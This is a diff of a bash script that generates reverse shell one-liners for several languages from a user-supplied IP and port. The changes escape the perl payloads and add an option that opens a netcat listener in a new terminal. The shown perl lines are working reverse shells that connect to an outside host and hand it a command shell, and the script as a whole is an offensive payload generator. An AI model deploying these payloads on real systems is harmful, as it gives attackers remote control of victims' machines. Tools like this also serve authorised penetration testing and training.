@@ -41,11 +41,13 @@ function perl() {
 
 	printf "${GREEN} LINUX: ${NC}\n"
 
-	printf "\tperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+	printf "\tperl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system\$_ while<>;'"
+
+	printf "\n\n"
 
 	printf "${GREEN} WINDOWS: ${NC}\n"
 
-	printf "\tperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+	printf "\tperl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"${IP}:${PORT}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system\$_ while<>;'"
 
 	printf "\n\n"
 }
@@ -134,6 +136,11 @@ function java() {
 
 }
 
+function spawn_listener() {
+	gnome-terminal -e "nc -lvp ${PORT}"
+
+}
+
 function help() {
 	printf "\n\t\t${RED}##########${NC}HELP MENU${RED}##########${NC}\n\n"
 
@@ -145,7 +152,9 @@ function help() {
 	printf "\n\t-n or --netcat to display reverse shells for netcat."
 	printf "\n\t-t or --telnet to display reverse shells for telnet."
 	printf "\n\t-j or --java to display reverse shells for java."
-	printf "\n\t-s or --sources to display sources\n\n"
+	printf "\n\t-s or --sources to display sources"
+	
+	printf "\n\t--terminal as second argument to spawn a netcat listener\n\n"
 }
 
 function sources() {
@@ -162,53 +171,85 @@ function sources() {
 if [[ $# -eq 0 ]] ; then
     help
     exit 0
-fi
 
-while true ; do
-	case "$1" in
-		-b| --bash) 
-		bash ; shift 
-		;;
+elif [[ $# -eq 1 ]] ; then
+	while true ; do
+		case "$1" in
+			-b| --bash) 
+			bash ; shift 
+			;;
 
-		-p| --perl)
-		perl ; shift
-		;;
+			-p| --perl)
+			perl ; shift
+			;;
 
-		-py| --python)
-		python ; shift
-		;;
+			-py| --python)
+			python ; shift
+			;;
 
-		-P| --php)
-		php ; shift
-		;;
+			-P| --php)
+			php ; shift
+			;;
 
-		-r| --ruby)
-		ruby ; shift
-		;;
+			-r| --ruby)
+			ruby ; shift
+			;;
 
-		-n| --netcat)
-		netcat ; shift
-		;;
+			-n| --netcat)
+			netcat ; shift
+			;;
 
-		-t| --telnet)
-		telnet ; shift
-		;;
+			-t| --telnet)
+			telnet ; shift
+			;;
 
-		-j| --java)
-		java ; shift
-		;;
+			-j| --java)
+			java ; shift
+			;;
 
-		-s| --sources)
-		sources ; shift
-		;;
+			-s| --sources)
+			sources ; shift
+			;;
 
-		-h| -\? | --help)
-		help ; shift
+			-h| -\? | --help)
+			help ; shift
+			break
+			;;
+
+		esac
+
 		break
-		;;
+	done
 
-	esac
-	break
-done
+elif [[ "$2" == "--terminal" ]] ; then
+	if [[ "$1" == "-b" ]] || [[ "$1" == "--bash" ]] ; then
+		bash
+	elif [[ "$1" == "-p" ]] || [[ "$1" == "--perl" ]] ; then
+		perl
+	elif [[ "$1" == "-py" ]] || [[ "$1" == "--python" ]] ; then
+		python
+	elif [[ "$1" == "-P" ]] || [[ "$1" == "--PHP" ]] ; then
+		php
+	elif [[ "$1" == "-r" ]] || [[ "$1" == "--ruby" ]] ; then
+		ruby
+	elif [[ "$1" == "-n" ]] || [[ "$1" == "--netcat" ]] ; then
+		netcat
+	elif [[ "$1" == "-t" ]] || [[ "$1" == "--telnet" ]] ; then
+		telnet
+	elif [[ "$1" == "-j" ]] || [[ "$1" == "--java" ]] ; then
+		java
+	elif [[ "$1" == "-s" ]] || [[ "$1" == "--sources" ]] ; then	
+		sources
+		exit 0
+	elif [[ "$1" == "-h" ]] || [[ "$1" == "--help" ]] ; then
+		help
+		exit 0
+	fi
+	
+	TERM=$(gnome-terminal -e "nc -lvp ${PORT}")
 
+elif [[ $# -eq 3 ]] ; then
+	printf "${RED}Too many arguments given!${NC}\n\n"
+	help
+fi
 	
